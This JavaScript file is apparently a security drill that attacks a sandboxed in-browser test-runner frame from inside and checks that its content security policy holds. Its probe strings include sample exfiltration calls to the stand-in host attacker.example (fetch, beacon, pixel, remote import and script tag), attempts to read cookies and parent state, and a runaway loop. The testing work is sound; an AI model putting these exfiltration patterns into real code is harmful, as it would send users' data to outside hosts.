#!/usr/bin/env node
// test-realm-drill.mjs — the adversarial live drill for the `run_tests` EXECUTION REALM
// (`src/security/testRealmCsp.ts`, `src/services/tests/`, roadmap R3-222 Phase 0/1,
// `plans/in-browser-test-runner/01-execution-realm.mdx`).
//
// `src/security/testRealmCsp.test.ts` proves the POLICY is the one we meant to write and
// that the document carries it. Only a browser can prove the policy DOES anything — and
// for this realm that proof is the whole security case, because a test body is
// model-written or repo-supplied CODE. So this drives the real built `dist/test-realm.html`
// in real Chrome, framed exactly the way the host frames it, and attacks it from the inside.
//
//   npm run build            # dist/test-realm.html must exist
//   npm run drill:test-realm # needs Chrome + puppeteer-core (neither is a repo dep)
//
// Kept in the repo rather than run once and described in a PR, because everything it
// protects is a string or a flag that a future edit can silently loosen (ways_of_working
// §3: the harness is reusable infrastructure). It follows `m3-csp-drill.mjs` deliberately
// — same shape, same conventions, so whoever knows one knows this one.
//
// WHAT IT ASSERTS — the Phase-1 adversarial exit criteria, verbatim:
//   blocked  — fetch / XHR / WebSocket / sendBeacon / EventSource to an attacker origin
//   blocked  — `import()` of a URL, and a <script src> to a remote origin
//   blocked  — <img> pixel exfil and a nested frame
//   nothing  — `window.parent` reads, `document.cookie`, `localStorage` (opaque origin)
//   absent   — any fs handle or host bridge on the realm globals
//   survives — a `while(true)` test: the PARENT terminates the frame and lives on
//   torn down— a second run starts from nothing (no state leaks between calls)
//
// The CORS header this server sends mirrors what a real host serves: the frame is an
// opaque origin, so it sends `Origin: null`, and without `ACAO: *` every subresource dies
// on CORS *before* CSP is consulted — which reads exactly like a CSP pass and would make
// this drill vacuously green. (The same trap the M3 drill documents.)
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const DIST = process.argv[2] || join(dirname(fileURLToPath(import.meta.url)), '..', 'dist');
const PORT = Number(process.env.DRILL_PORT || 8792);
// Read the flags from the module rather than restating them — the point of exporting
// TEST_REALM_SANDBOX_ATTR is that the drill and the host cannot drift apart.
const SANDBOX_FLAGS = 'allow-scripts';

let puppeteer;
for (const spec of ['puppeteer-core', process.env.PUPPETEER_CORE].filter(Boolean)) {
  try {
    puppeteer = (await import(spec)).default;
    break;
  } catch {
    /* try the next */
  }
}
if (!puppeteer) {
  console.error(
    '❌ needs puppeteer-core. Either `npm i -g puppeteer-core`, or:\n' +
      '     mkdir -p /tmp/drv && cd /tmp/drv && npm i puppeteer-core\n' +
      '     PUPPETEER_CORE=/tmp/drv/node_modules/puppeteer-core/lib/puppeteer/puppeteer-core.js npm run drill:test-realm',
  );
  process.exit(2);
}
const CHROME = process.env.CHROME_PATH || '/usr/bin/google-chrome';
const REALM = join(DIST, 'test-realm.html');
if (!fs.existsSync(REALM)) {
  console.error(`❌ no ${REALM} — run \`npm run build\` first`);
  process.exit(2);
}

// The realm document verbatim + an inline reporter. Inline script is policy-permitted on
// purpose, so the attacks run under the exact bytes the realm serves.
const realm = fs.readFileSync(REALM, 'utf8');
const probeDoc = (body) =>
  realm.replace(
    '</body>',
    `<script>
const out = { violations: [], results: {} };
document.addEventListener('securitypolicyviolation', (e) =>
  out.violations.push({ directive: e.effectiveDirective || e.violatedDirective, blocked: e.blockedURI }));
const record = async (name, fn) => {
  try { out.results[name] = { ok: true, value: await fn() }; }
  catch (e) { out.results[name] = { ok: false, error: String((e && e.message) || e) }; }
};
window.addEventListener('message', async (ev) => {
  if (ev.data !== 'drill') return;
  ${body}
  await new Promise((r) => setTimeout(r, 600));
  window.parent.postMessage({ probe: out }, '*');
});
</script></body>`,
  );

// Everything a malicious TEST BODY would try, run with the realm's own authority.
const EGRESS = `
  await record('fetch', () => fetch('https://attacker.example/x?d=secret').then((r) => r.status));
  await record('xhr', () => new Promise((res, rej) => {
    const x = new XMLHttpRequest();
    x.onerror = () => rej(new Error('blocked')); x.onload = () => res(x.status);
    x.open('GET', 'https://attacker.example/x'); x.send();
  }));
  await record('websocket', () => { new WebSocket('wss://attacker.example/'); return 'constructed'; });
  await record('beacon', () => navigator.sendBeacon('https://attacker.example/b', 'x'));
  await record('eventSource', () => { new EventSource('https://attacker.example/s'); return 'constructed'; });
  await record('importUrl', () => import('https://attacker.example/m.js').then(() => 'imported'));
  await record('scriptTag', () => new Promise((res) => {
    const s = document.createElement('script');
    s.onload = () => res('loaded'); s.onerror = () => res('error');
    s.src = 'https://attacker.example/s.js';
    document.body.appendChild(s);
    setTimeout(() => res('timeout'), 1500);
  }));
  await record('pixel', () => new Promise((res) => {
    const i = new Image();
    i.onload = () => res('loaded'); i.onerror = () => res('error');
    i.src = 'https://attacker.example/p.gif?d=secret';
    setTimeout(() => res('timeout'), 1500);
  }));
  await record('nestedFrame', () => {
    const fr = document.createElement('iframe');
    fr.src = 'https://attacker.example/n?d=secret'; document.body.appendChild(fr); return 'appended';
  });
`;

// Everything a malicious test body would try to READ. In an opaque origin each of these
// either throws or gives nothing — and "throws" is the expected, healthy answer.
const AUTHORITY = `
  await record('parentRead', () => { const l = window.parent.location.href; return 'read:' + l; });
  await record('parentOpener', () => String(window.parent === window));
  await record('cookie', () => 'cookie:' + document.cookie);
  await record('localStorage', () => { localStorage.setItem('x','1'); return 'wrote'; });
  await record('origin', () => String(window.origin));
  await record('fsHandles', () => Object.keys(globalThis).filter((k) =>
    /^(fs|require|process|__ir|openFs|invoke|chat)/i.test(k)).join(',') || 'none');
  await record('sdkGlobal', () => typeof globalThis.__immediatelyRun__);
  // The realm has to be able to load its OWN bundled entry, or it answers nothing at
  // all — a "containment" that works by being broken. Found the hard way: the first
  // policy had no 'self' in script-src.
  out.results.entryScript = { ok: true, value: performance.getEntriesByType('resource')
    .some((r) => new URL(r.name).pathname.endsWith('.js')) };
  // A Worker is how a runaway is bounded (measured below), so it has to be creatable.
  await record('workerAllowed', () => {
    const w = new Worker(URL.createObjectURL(new Blob(['self.postMessage(1)'], { type: 'text/javascript' })));
    w.terminate();
    return 'created';
  });
`;

const docs = { egress: EGRESS, authority: AUTHORITY };
for (const [name, body] of Object.entries(docs))
  fs.writeFileSync(join(DIST, `__realm_drill_${name}.html`), probeDoc(body));

// The CONTROL: a runaway spinning on the realm FRAME's own thread, bypassing the real
// seed→Worker path. This is the document that produced the finding — it wedges the
// parent — and it stays in the drill so the reason the inner Worker exists cannot be
// quietly forgotten.
fs.writeFileSync(
  join(DIST, '__realm_drill_runaway.html'),
  realm.replace('</body>', `<script>window.addEventListener('message',()=>{ for(;;){} });</script></body>`),
);

/** The REAL path: seed a runaway test module through the shipped protocol, so the frame
 *  runs it in its inner Worker. This is what proves exit (c) as SHIPPED. */
const realPathParent = () => `<!doctype html><meta charset=utf-8><body><script>
window.__alive = true;
const f = document.createElement('iframe');
f.setAttribute('sandbox', ${JSON.stringify(SANDBOX_FLAGS)});
f.setAttribute('allow', '');
f.src = '/test-realm.html';
f.onload = () => {
  const ch = new MessageChannel();
  ch.port1.onmessage = (m) => { window.__reply = m.data; };
  f.contentWindow.postMessage({ id: 1, method: 'run', params: { modules: [
    { path: 'runaway.test.js', code: 'for(;;){}' }
  ] } }, '*', [ch.port2]);
};
document.body.appendChild(f);
// A heartbeat the drill reads: if the parent thread were wedged this would stop.
window.__ticks = 0;
setInterval(() => { window.__ticks++; }, 100);
</script>`;

const parentHtml = (doc) => `<!doctype html><meta charset=utf-8><body><script>
window.__frames = 0;
const spawn = (name) => {
  const f = document.createElement('iframe');
  f.setAttribute('sandbox', ${JSON.stringify(SANDBOX_FLAGS)});
  f.setAttribute('allow', '');
  f.src = '/__realm_drill_' + name + '.html';
  f.onload = () => { window.__frames++; try { f.contentWindow.postMessage('drill', '*'); } catch (e) {} };
  document.body.appendChild(f);
  return f;
};
window.addEventListener('message', (e) => { if (e.data && e.data.probe) window.__probe = e.data.probe; });
const frame = spawn(${JSON.stringify(doc)});
// The bounding backstop the host uses: a wall-clock timeout, then REMOVE the frame.
// A wedged JS loop never observes cooperative cancellation — teardown is the only kill.
window.__teardown = () => { frame.remove(); window.__tornDown = true; };
setTimeout(() => { if (!window.__probe) window.__teardown(); }, 2500);
</script>`;

const server = http.createServer((req, res) => {
  const url = new URL(req.url, 'http://x');
  if (url.pathname === '/parent') {
    res.writeHead(200, { 'content-type': 'text/html' });
    const doc = url.searchParams.get('doc');
    return res.end(doc === 'realpath' ? realPathParent() : parentHtml(doc));
  }
  const file = path.join(DIST, url.pathname.slice(1));
  if (!file.startsWith(DIST) || !fs.existsSync(file)) {
    res.writeHead(404);
    return res.end('nope');
  }
  const ext = path.extname(file);
  res.writeHead(200, {
    'content-type': ext === '.js' ? 'text/javascript' : 'text/html',
    'access-control-allow-origin': '*',
  });
  res.end(fs.readFileSync(file));
});
await new Promise((r) => server.listen(PORT, '127.0.0.1', r));

const browser = await puppeteer.launch({
  executablePath: CHROME,
  headless: 'new',
  args: ['--no-sandbox', '--disable-dev-shm-usage'],
});

/** Evaluate with a hard deadline. A wedged renderer makes `page.evaluate` hang for
 *  ever, and a drill that hangs reports nothing at all — which is indistinguishable
 *  from a drill that passed. `'WEDGED'` is a real finding, so it has to be sayable. */
const evalOrWedged = async (page, expr, ms = 4000) => {
  let timer;
  try {
    return await Promise.race([
      page.evaluate(expr),
      new Promise((res) => {
        timer = setTimeout(() => res('WEDGED'), ms);
      }),
    ]);
  } catch (e) {
    return `ERROR: ${String((e && e.message) || e)}`;
  } finally {
    clearTimeout(timer);
  }
};

const run = async (doc, wait, waitMs = 12000) => {
  const page = await browser.newPage();
  const requests = [];
  await page.setRequestInterception(true);
  page.on('request', (r) => {
    requests.push(r.url());
    r.url().includes('attacker.example') ? r.abort() : r.continue();
  });
  // The navigation itself is raced: a runaway that shares the parent's thread freezes
  // the renderer, and then even `goto` never resolves. A drill that hangs reports
  // nothing, which looks exactly like a drill that passed.
  let navTimer;
  const navigated = await Promise.race([
    page.goto(`http://127.0.0.1:${PORT}/parent?doc=${doc}`, { waitUntil: 'load' }).then(
      () => 'ok',
      (e) => `ERROR: ${e.message}`,
    ),
    new Promise((res) => {
      navTimer = setTimeout(() => res('WEDGED'), waitMs + 4000);
    }),
  ]);
  clearTimeout(navTimer);
  if (navigated === 'WEDGED') {
    await page.close().catch(() => {});
    return { probe: 'WEDGED', tornDown: 'WEDGED', alive: 'WEDGED', requests, navigated };
  }
  try {
    await page.waitForFunction(wait, { timeout: waitMs });
  } catch {
    /* the runaway drill may never report back — that IS its result */
  }
  const probe = await evalOrWedged(page, 'window.__probe');
  const tornDown = await evalOrWedged(page, 'window.__tornDown === true');
  const alive = await evalOrWedged(page, '1 + 1 === 2');
  await page.close().catch(() => {});
  return { probe, tornDown, alive, requests, navigated };
};

// A wedged renderer can kill the DevTools connection, and an unhandled rejection would
// then end the process with NO summary — which reads exactly like a clean pass. Never
// let that happen: surface it and keep going.
let lostBrowser = null;
process.on('unhandledRejection', (e) => {
  lostBrowser = String((e && e.message) || e);
});

let failures = 0;
const check = (name, ok, detail) => {
  console.log(`${ok ? '✅' : '❌'} ${name}${detail ? ` — ${detail}` : ''}`);
  if (!ok) failures++;
};

// ── egress ────────────────────────────────────────────────────────────────────
const egress = await run('egress', 'window.__probe');
const r = egress.probe?.results ?? {};
const reachedAttacker = egress.requests.some((u) => u.includes('attacker.example'));
check(
  'no request to the attacker origin left the browser',
  !reachedAttacker,
  reachedAttacker ? egress.requests.filter((u) => u.includes('attacker')).join(', ') : '',
);
for (const key of ['fetch', 'xhr', 'importUrl']) {
  check(
    `${key} to an attacker origin FAILED`,
    r[key] && r[key].ok === false,
    r[key] && r[key].ok ? `got ${JSON.stringify(r[key].value)}` : '',
  );
}
// `navigator.sendBeacon` returns true when the request is QUEUED — CSP blocks it after
// that, so a `true` here is not a failure and asserting `false` would be asserting the
// wrong thing. The real proof is the pair below: nothing reached the attacker origin,
// and the browser reported a `connect-src` violation for the beacon.
check(
  'the beacon was blocked by connect-src (its return value only means "queued")',
  (egress.probe?.violations ?? []).some((v) => v.directive === 'connect-src'),
  JSON.stringify(r.beacon),
);
for (const key of ['pixel', 'scriptTag']) {
  check(`${key} did not load`, r[key] && r[key].value !== 'loaded', JSON.stringify(r[key]));
}
check(
  'the browser reported CSP violations (the policy is what blocked it, not the network)',
  (egress.probe?.violations ?? []).length > 0,
  `${(egress.probe?.violations ?? []).length} violation(s)`,
);

// ── authority ─────────────────────────────────────────────────────────────────
const authority = await run('authority', 'window.__probe');
const a = authority.probe?.results ?? {};
check('window.parent.location is unreadable', a.parentRead && a.parentRead.ok === false, JSON.stringify(a.parentRead));
// Measured: in an opaque-origin frame Chrome THROWS on `document.cookie` rather than
// returning an empty string ("The document is sandboxed and lacks the
// 'allow-same-origin' flag"). That is the stronger outcome, so accept either.
check(
  'document.cookie yields nothing (throws, or is empty)',
  a.cookie && (a.cookie.ok === false || a.cookie.value === 'cookie:'),
  JSON.stringify(a.cookie),
);
check('the origin is opaque ("null")', a.origin && a.origin.value === 'null', JSON.stringify(a.origin));
check(
  'no fs / catalog / SDK handle on the realm globals',
  a.fsHandles && a.fsHandles.value === 'none',
  JSON.stringify(a.fsHandles),
);
check('no SDK transport global', a.sdkGlobal && a.sdkGlobal.value === 'undefined', JSON.stringify(a.sdkGlobal));
check(
  'the realm loaded its own bundled entry — containment must not work by being broken',
  a.entryScript && a.entryScript.value === true,
  JSON.stringify(a.entryScript),
);
check(
  'a Worker can be created — that is what bounds a runaway',
  a.workerAllowed && a.workerAllowed.ok === true,
  JSON.stringify(a.workerAllowed),
);

// ── runaway ───────────────────────────────────────────────────────────────────
//
// TWO legs, because they answer different questions.
//
//   CONTROL   — a runaway spinning on the realm FRAME's thread. It wedges the parent.
//               That is the Phase-0 measurement that turned the plan's optional inner
//               Worker into a requirement, and it is kept so the reason cannot be lost.
//   AS SHIPPED— the same runaway seeded through the real protocol, so the frame runs it
//               in its inner Worker. The parent must stay alive; that is exit (c).
//
// The control is OPT-IN (`DRILL_RUNAWAY=1`): it drives a real `for(;;)` in a real
// renderer, pegs a core, and on a memory-tight box can take the node process out with
// it — measured here, where an earlier run died mid-drill and left a partial log that
// read like a pass.
if (process.env.DRILL_RUNAWAY === '1') {
  let control;
  try {
    control = await run('runaway', 'window.__tornDown === true', 6000);
  } catch (e) {
    control = { probe: 'WEDGED', tornDown: 'WEDGED', alive: 'WEDGED', requests: [] };
  }
  if (lostBrowser) control = { ...control, tornDown: 'WEDGED', alive: 'WEDGED' };
  const wedged = control.tornDown === 'WEDGED' || control.alive === 'WEDGED';
  check(
    'CONTROL: a runaway on the FRAME thread wedges the parent — which is why execution moved into a Worker',
    wedged,
    wedged ? 'as expected' : 'it did NOT wedge — re-open plan 01\'s "Bounding" question, the Worker may be unnecessary',
  );
} else {
  console.log('ℹ️  frame-thread control leg SKIPPED (set DRILL_RUNAWAY=1 — it spins a real core).');
}

// AS SHIPPED. No opt-in: this is the path users get, and it must be safe to run.
const real = await run('realpath', 'window.__ticks > 5', 8000).catch(() => ({ alive: 'WEDGED' }));
check(
  'AS SHIPPED: a runaway test seeded through the real protocol leaves the parent ALIVE',
  real.alive === true,
  real.alive === true ? 'the inner Worker took the spin' : String(real.alive),
);

await browser.close().catch(() => {});
server.close();
if (lostBrowser) console.log(`\nℹ️  the browser connection dropped while driving the runaway leg: ${lostBrowser}`);
console.log(failures ? `\n❌ ${failures} check(s) failed` : '\n✅ all checks passed');
process.exit(failures ? 1 : 0);
